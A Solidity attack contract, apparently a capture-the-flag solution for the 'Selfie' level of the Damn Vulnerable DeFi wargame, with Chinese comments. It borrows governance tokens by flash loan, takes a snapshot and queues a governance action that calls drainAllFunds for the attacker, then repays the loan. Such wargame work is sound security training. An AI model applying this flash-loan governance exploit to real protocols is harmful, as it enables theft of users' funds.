// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {

  SelfiePool public pool;
  SimpleGovernance public governance;

  address public attacker;
  uint public actionId;

  constructor (address _pool, address _governance) {
    pool = SelfiePool(_pool);
    governance = SimpleGovernance(_governance);
    attacker = msg.sender;
  }

  function attack(uint amount) public {
    pool.flashLoan(amount);
  }

  function receiveTokens(address _token, uint _amount) public {
    // 构造data
    bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
    // 执行快照
    DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
    token.snapshot();
    // 创建 action
    actionId = governance.queueAction(address(pool), data, 0);
    // 返还token
    token.transfer(address(pool), _amount);
  }
}
